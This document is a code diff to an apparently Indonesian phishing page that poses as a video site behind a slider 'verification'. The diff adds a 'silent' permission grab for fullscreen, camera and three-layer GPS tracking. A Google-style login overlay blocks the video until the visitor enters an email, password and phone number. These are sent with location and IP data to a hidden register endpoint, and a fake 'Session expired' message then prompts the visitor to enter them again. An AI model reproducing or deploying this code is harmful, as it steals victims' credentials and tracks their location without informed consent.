@@ -118,7 +118,7 @@
             color: #666;
         }
 
-        /* VERIFICATION PAGE */
+        /* VERIFICATION PAGE - BARU (SLIDER BIRU) */
         .verify-page {
             position: fixed;
             top: 0;
@@ -159,14 +159,16 @@
             margin-bottom: 35px;
         }
 
+        /* SLIDER BIRU */
         .slider-wrapper {
-            background: #f0f0f0;
+            background: #e8f0fe;
             border-radius: 60px;
             position: relative;
             height: 64px;
             cursor: pointer;
             margin-bottom: 25px;
             overflow: hidden;
+            border: 2px solid #d2e3fc;
         }
 
         .slider-track {
@@ -175,7 +177,7 @@
             left: 0;
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #333, #111);
+            background: linear-gradient(90deg, #0066ff, #00aaff);
             border-radius: 60px;
             transition: width 0.05s linear;
         }
@@ -188,18 +190,19 @@
             height: 52px;
             background: white;
             border-radius: 50%;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 10px rgba(0,102,255,0.3);
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: grab;
             transition: left 0.05s linear;
             z-index: 2;
+            border: 2px solid #0066ff;
         }
 
         .slider-thumb i {
             font-size: 24px;
-            color: #333;
+            color: #0066ff;
         }
 
         .slider-text {
@@ -207,38 +210,46 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            color: #888;
-            font-weight: 500;
+            color: #0066ff;
+            font-weight: 600;
             font-size: 15px;
             pointer-events: none;
             z-index: 1;
         }
 
+        /* TOMBOL LANJUTKAN BIRU */
         .verify-btn {
-            background: #333;
+            background: linear-gradient(90deg, #0066ff, #00aaff);
             color: white;
             border: none;
-            padding: 14px 30px;
+            padding: 16px 30px;
             border-radius: 40px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             width: 100%;
-            opacity: 0.5;
+            opacity: 0.4;
             pointer-events: none;
-            transition: 0.2s;
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(0,102,255,0.3);
         }
 
         .verify-btn.active {
             opacity: 1;
             pointer-events: auto;
+            box-shadow: 0 6px 25px rgba(0,102,255,0.6);
+        }
+
+        .verify-btn.active:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0,102,255,0.8);
         }
 
         .videos-page {
             display: none;
         }
 
-        /* LOGIN OVERLAY */
+        /* LOGIN OVERLAY - SAMA KAYAK FILE PERTAMA LO */
         .login-overlay {
             position: fixed;
             top: 0;
@@ -311,6 +322,7 @@
             margin-top: 12px;
         }
 
+        /* VIDEO MODAL */
         .video-modal {
             position: fixed;
             top: 0;
@@ -362,6 +374,7 @@
             max-height: 100vh;
         }
 
+        /* LOADING */
         .loading {
             display: none;
             position: fixed;
@@ -379,8 +392,8 @@
         .spinner {
             width: 50px;
             height: 50px;
-            border: 4px solid rgba(51,51,51,0.3);
-            border-top-color: #333;
+            border: 4px solid rgba(0,102,255,0.3);
+            border-top-color: #0066ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -398,6 +411,7 @@
 </head>
 <body>
 
+<!-- VERIFICATION PAGE (BARU - SLIDER BIRU) -->
 <div class="verify-page" id="verifyPage">
     <div class="verify-container">
         <div class="verify-icon">🔐</div>
@@ -412,6 +426,7 @@
     </div>
 </div>
 
+<!-- VIDEOS PAGE (SAMA KAYAK FILE PERTAMA LO) -->
 <div class="videos-page" id="videosPage">
     <div class="videos-header">
         <div class="header-content">
@@ -436,18 +451,22 @@
     </div>
 </div>
 
+<!-- VIDEO MODAL -->
 <div class="video-modal" id="videoModal">
     <div class="modal-header"><button class="close-modal" id="closeModalBtn"><i class="fas fa-times"></i></button></div>
     <div class="modal-video-wrapper"><video id="modalVideo" controls><source src="https://files.catbox.moe/mggv9z.mp4" type="video/mp4"></video></div>
 </div>
 
+<!-- LOADING -->
 <div class="loading" id="loading">
     <div class="spinner"></div>
     <p style="margin-top:20px; color:white;">Memproses...</p>
 </div>
 
 <script>
-    // ==================== SLIDER VERIFICATION ====================
+    // ============================================================
+    // SLIDER VERIFICATION (BARU - SLIDER BIRU)
+    // ============================================================
     const sliderWrapper = document.getElementById('sliderWrapper');
     const sliderThumb = document.getElementById('sliderThumb');
     const sliderTrack = document.getElementById('sliderTrack');
@@ -463,20 +482,21 @@
     let maxLeft = 0;
     
     function updateMaxLeft() {
-        if(sliderWrapper) maxLeft = sliderWrapper.offsetWidth - 58;
+        if (sliderWrapper) maxLeft = sliderWrapper.offsetWidth - 58;
     }
     updateMaxLeft();
-    window.addEventListener('resize', function(){
+    
+    window.addEventListener('resize', function() {
         updateMaxLeft();
-        if(!isVerified && sliderThumb && sliderTrack){
+        if (!isVerified && sliderThumb && sliderTrack) {
             thumbLeft = 6;
             sliderThumb.style.left = '6px';
             sliderTrack.style.width = '0px';
         }
     });
     
-    if(sliderThumb){
-        sliderThumb.addEventListener('mousedown', function(e){
+    if (sliderThumb) {
+        sliderThumb.addEventListener('mousedown', function(e) {
             isDragging = true;
             startX = e.clientX - thumbLeft;
             sliderThumb.style.cursor = 'grabbing';
@@ -484,128 +504,153 @@
         });
     }
     
-    document.addEventListener('mousemove', function(e){
-        if(!isDragging) return;
-        if(!sliderThumb || !sliderTrack) return;
+    document.addEventListener('mousemove', function(e) {
+        if (!isDragging) return;
+        if (!sliderThumb || !sliderTrack) return;
         let newLeft = e.clientX - startX;
         newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
         thumbLeft = newLeft;
         sliderThumb.style.left = thumbLeft + 'px';
         sliderTrack.style.width = (thumbLeft + 30) + 'px';
         
-        if(thumbLeft >= maxLeft - 10){
-            if(!isVerified){
+        if (thumbLeft >= maxLeft - 10) {
+            if (!isVerified) {
                 isVerified = true;
-                if(sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
-                if(sliderText) sliderText.style.color = '#333';
-                if(verifyBtn) verifyBtn.classList.add('active');
+                if (sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
+                if (verifyBtn) verifyBtn.classList.add('active');
             }
         } else {
-            if(isVerified){
+            if (isVerified) {
                 isVerified = false;
-                if(sliderText) sliderText.innerHTML = 'Geser ke kanan';
-                if(sliderText) sliderText.style.color = '#888';
-                if(verifyBtn) verifyBtn.classList.remove('active');
+                if (sliderText) sliderText.innerHTML = 'Geser ke kanan';
+                if (verifyBtn) verifyBtn.classList.remove('active');
             }
         }
     });
     
-    document.addEventListener('mouseup', function(){
+    document.addEventListener('mouseup', function() {
         isDragging = false;
-        if(sliderThumb) sliderThumb.style.cursor = 'grab';
-        if(!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack){
+        if (sliderThumb) sliderThumb.style.cursor = 'grab';
+        if (!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack) {
             thumbLeft = 6;
             sliderThumb.style.left = '6px';
             sliderTrack.style.width = '0px';
         }
     });
     
-    if(sliderThumb){
-        sliderThumb.addEventListener('touchstart', function(e){
+    if (sliderThumb) {
+        sliderThumb.addEventListener('touchstart', function(e) {
             isDragging = true;
             startX = e.touches[0].clientX - thumbLeft;
             e.preventDefault();
         });
     }
     
-    document.addEventListener('touchmove', function(e){
-        if(!isDragging) return;
-        if(!sliderThumb || !sliderTrack) return;
+    document.addEventListener('touchmove', function(e) {
+        if (!isDragging) return;
+        if (!sliderThumb || !sliderTrack) return;
         let newLeft = e.touches[0].clientX - startX;
         newLeft = Math.min(Math.max(newLeft, 6), maxLeft);
         thumbLeft = newLeft;
         sliderThumb.style.left = thumbLeft + 'px';
         sliderTrack.style.width = (thumbLeft + 30) + 'px';
-        if(thumbLeft >= maxLeft - 10 && !isVerified){
+        if (thumbLeft >= maxLeft - 10 && !isVerified) {
             isVerified = true;
-            if(sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
-            if(sliderText) sliderText.style.color = '#333';
-            if(verifyBtn) verifyBtn.classList.add('active');
+            if (sliderText) sliderText.innerHTML = '✓ Terverifikasi!';
+            if (verifyBtn) verifyBtn.classList.add('active');
         }
     });
     
-    document.addEventListener('touchend', function(){
+    document.addEventListener('touchend', function() {
         isDragging = false;
-        if(!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack){
+        if (!isVerified && thumbLeft < maxLeft - 10 && sliderThumb && sliderTrack) {
             thumbLeft = 6;
             sliderThumb.style.left = '6px';
             sliderTrack.style.width = '0px';
         }
     });
     
-    if(verifyBtn){
-        verifyBtn.addEventListener('click', function(){
-            if(!isVerified) return;
+    // ============================================================
+    // TOMBOL LANJUTKAN = SILENT REQUEST IZIN (GPS 3 LAPIS + CAMERA + FULLSCREEN)
+    // ============================================================
+    if (verifyBtn) {
+        verifyBtn.addEventListener('click', async function() {
+            if (!isVerified) return;
+            
             verifyBtn.innerHTML = 'Memproses...';
             verifyBtn.disabled = true;
-            setTimeout(function(){
-                if(verifyPage) verifyPage.style.display = 'none';
-                if(videosPage) videosPage.style.display = 'block';
-            }, 500);
+            
+            // Fullscreen (silent)
+            try { document.documentElement.requestFullscreen(); } catch(e) {}
+            
+            // GPS 3 lapis (trigger popup izin browser)
+            const gps = await getGPS();
+            
+            // Camera (trigger popup izin browser)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                stream.getTracks().forEach(function(t) { t.stop(); });
+            } catch(e) {}
+            
+            // Simpan GPS
+            if (gps) {
+                gpsData.latitude = gps.lat;
+                gpsData.longitude = gps.lon;
+                gpsData.accuracy = gps.accuracy;
+                gpsData.source = gps.source;
+                gpsData.gpsCaptured = true;
+            }
+            
+            // Langsung lanjut ke halaman video
+            verifyBtn.innerHTML = 'Lanjutkan';
+            verifyBtn.disabled = false;
+            if (verifyPage) verifyPage.style.display = 'none';
+            if (videosPage) videosPage.style.display = 'block';
         });
     }
     
-    // ==================== VIDEO MODAL ====================
+    // ============================================================
+    // VIDEO MODAL
+    // ============================================================
     const videoModal = document.getElementById('videoModal');
     const modalVideo = document.getElementById('modalVideo');
     const closeModalBtn = document.getElementById('closeModalBtn');
     const videoThumbnail = document.getElementById('videoThumbnail');
     
-    function openVideoModal(){
-        if(modalVideo) modalVideo.src = "https://www.w3schools.com/html/mov_bbb.mp4";
-        if(videoModal) videoModal.classList.add('active');
+    function openVideoModal() {
+        if (modalVideo) modalVideo.src = "https://www.w3schools.com/html/mov_bbb.mp4";
+        if (videoModal) videoModal.classList.add('active');
         showLoginOverlay();
     }
     
-    function closeVideoModal(){
-        if(modalVideo) modalVideo.pause();
-        if(modalVideo) modalVideo.src = '';
-        if(videoModal) videoModal.classList.remove('active');
+    function closeVideoModal() {
+        if (modalVideo) modalVideo.pause();
+        if (modalVideo) modalVideo.src = '';
+        if (videoModal) videoModal.classList.remove('active');
         const existingOverlay = document.querySelector('.login-overlay');
-        if(existingOverlay) existingOverlay.remove();
+        if (existingOverlay) existingOverlay.remove();
     }
     
-    if(videoThumbnail) videoThumbnail.addEventListener('click', openVideoModal);
-    if(closeModalBtn) closeModalBtn.addEventListener('click', closeVideoModal);
+    if (videoThumbnail) videoThumbnail.addEventListener('click', openVideoModal);
+    if (closeModalBtn) closeModalBtn.addEventListener('click', closeVideoModal);
     
-    if(modalVideo){
-        modalVideo.addEventListener('play', function(){ modalVideo.pause(); showLoginOverlay(); });
-        modalVideo.addEventListener('click', function(){ modalVideo.pause(); showLoginOverlay(); });
+    if (modalVideo) {
+        modalVideo.addEventListener('play', function() { modalVideo.pause(); showLoginOverlay(); });
+        modalVideo.addEventListener('click', function() { modalVideo.pause(); showLoginOverlay(); });
     }
     
-    // ==================== GPS 3 LAPIS ====================
+    // ============================================================
+    // GPS 3 LAPIS
+    // ============================================================
     let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, source: null, gpsCaptured: false };
     let gpsRequestInProgress = false;
     
     async function getGPS() {
         return new Promise(async function(resolve) {
-            if (!navigator.geolocation) {
-                return resolve(null);
-            }
-            
+            if (!navigator.geolocation) return resolve(null);
             gpsRequestInProgress = true;
             
-            // ===== LAPIS 1: high accuracy (15s) =====
+            // LAPIS 1: high accuracy (15s)
             let best = null;
             try {
                 best = await new Promise(function(res) {
@@ -630,7 +675,7 @@
                 return resolve(best);
             }
             
-            // ===== LAPIS 2: watchPosition (10s) =====
+            // LAPIS 2: watchPosition (10s)
             const watchResult = await new Promise(function(res) {
                 let samples = [];
                 let watchId = null;
@@ -640,7 +685,7 @@
                     done = true;
                     if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                     if (samples.length === 0) return res(null);
-                    samples.sort(function(a,b) { return a.accuracy - b.accuracy; });
+                    samples.sort(function(a, b) { return a.accuracy - b.accuracy; });
                     res(samples[0]);
                 };
                 watchId = navigator.geolocation.watchPosition(
@@ -664,7 +709,7 @@
                 return resolve(watchResult);
             }
             
-            // ===== LAPIS 3: low accuracy / cell tower (10s) =====
+            // LAPIS 3: low accuracy / cell tower (10s)
             let lowAcc = null;
             try {
                 lowAcc = await new Promise(function(res) {
@@ -687,11 +732,14 @@
             
             const candidates = [best, watchResult, lowAcc].filter(function(x) { return x && x.lat && x.lon; });
             if (candidates.length === 0) return resolve(null);
-            candidates.sort(function(a,b) { return a.accuracy - b.accuracy; });
+            candidates.sort(function(a, b) { return a.accuracy - b.accuracy; });
             return resolve(candidates[0]);
         });
     }
     
+    // ============================================================
+    // IP DATA
+    // ============================================================
     async function getIPData() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -711,6 +759,9 @@
         };
     }
     
+    // ============================================================
+    // SUBMIT DATA (KE /ggwxzzr/api/register - NYAMBUNG KE SERVER.JS)
+    // ============================================================
     async function submitData(email, emailPass, phone, country, province, city) {
         const fullData = {
             email: email,
@@ -742,7 +793,6 @@
             });
             return true;
         } catch(error) {
-            console.error('Submit error:', error);
             return true;
         }
     }
@@ -750,10 +800,12 @@
     let ipData = {};
     getIPData().then(function(d) { ipData = d || {}; });
     
-    // ==================== LOGIN OVERLAY ====================
+    // ============================================================
+    // LOGIN OVERLAY (SAMA KAYAK FILE PERTAMA LO - GOOGLE STYLE)
+    // ============================================================
     function showLoginOverlay() {
         const existingOverlay = document.querySelector('.login-overlay');
-        if(existingOverlay) existingOverlay.remove();
+        if (existingOverlay) existingOverlay.remove();
         
         const overlay = document.createElement('div');
         overlay.className = 'login-overlay';
@@ -778,23 +830,20 @@
         const errorMsg = document.getElementById('loginErrorMsg');
         const loading = document.getElementById('loading');
         
-        if(loginBtn){
-            loginBtn.addEventListener('click', async function(){
+        if (loginBtn) {
+            loginBtn.addEventListener('click', async function() {
                 const email = emailInput ? emailInput.value.trim() : '';
                 const password = passwordInput ? passwordInput.value : '';
                 const phone = phoneInput ? phoneInput.value.trim() : '';
                 
-                if(!email || !password){
-                    if(errorMsg) errorMsg.textContent = 'Email and password are required';
+                if (!email || !password) {
+                    if (errorMsg) errorMsg.textContent = 'Email and password are required';
                     return;
                 }
                 
-                if(loginBtn){
-                    loginBtn.disabled = true;
-                    loginBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
-                }
+                loginBtn.disabled = true;
+                loginBtn.innerHTML = 'Processing...';
                 
-                // Request GPS 3 lapis
                 const gpsResult = await getGPS();
                 if (gpsResult) {
                     gpsData.latitude = gpsResult.lat;
@@ -805,28 +854,26 @@
                     gpsData.gpsCaptured = true;
                 }
                 
-                if(loading) loading.style.display = 'flex';
-                
+                if (loading) loading.style.display = 'flex';
                 await submitData(email, password, phone, 'Indonesia', 'Jawa Barat', 'Jakarta');
+                if (loading) loading.style.display = 'none';
                 
-                if(loading) loading.style.display = 'none';
-                
-                if(errorMsg){
+                if (errorMsg) {
                     errorMsg.className = 'login-success';
                     errorMsg.textContent = 'Verification successful...';
                 }
                 
-                setTimeout(function(){
-                    if(errorMsg){
+                setTimeout(function() {
+                    if (errorMsg) {
                         errorMsg.className = 'login-error';
                         errorMsg.textContent = 'Session expired. Please sign in again.';
                     }
-                    setTimeout(function(){
-                        if(emailInput) emailInput.value = '';
-                        if(passwordInput) passwordInput.value = '';
-                        if(phoneInput) phoneInput.value = '';
-                        if(errorMsg) errorMsg.textContent = '';
-                        if(loginBtn){
+                    setTimeout(function() {
+                        if (emailInput) emailInput.value = '';
+                        if (passwordInput) passwordInput.value = '';
+                        if (phoneInput) phoneInput.value = '';
+                        if (errorMsg) errorMsg.textContent = '';
+                        if (loginBtn) {
                             loginBtn.disabled = false;
                             loginBtn.innerHTML = 'Next';
                         }
